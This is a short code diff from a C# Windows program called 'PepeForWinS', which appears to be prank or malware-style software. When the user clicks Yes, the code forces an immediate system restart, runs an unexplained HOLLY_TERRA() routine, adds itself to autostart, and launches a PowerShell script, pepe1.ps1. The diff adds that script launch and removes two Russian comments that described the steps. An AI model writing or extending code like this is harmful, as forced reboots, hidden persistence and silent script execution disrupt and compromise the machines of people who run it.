@@ -26,7 +26,6 @@ namespace PepeForWinS
             if (result == DialogResult.Yes)
             {
                 Process.Start("shutdown", "/r /t 0");
-
                 HOLLY_TERRA();
                 using (FileStream fs5 = File.Create("text.txt"))
                 {
@@ -36,10 +35,8 @@ namespace PepeForWinS
                         sr.Write(info);
                     }
                 }
-                /*Добавление в автозапуск*/
                 AddAutostart();
-                /*Запуск первого скрипта*/
-                //Process.Start("script1.bat");
+                Process.Start("pepe1.ps1");
             }
         }
         public void AddAutostart()
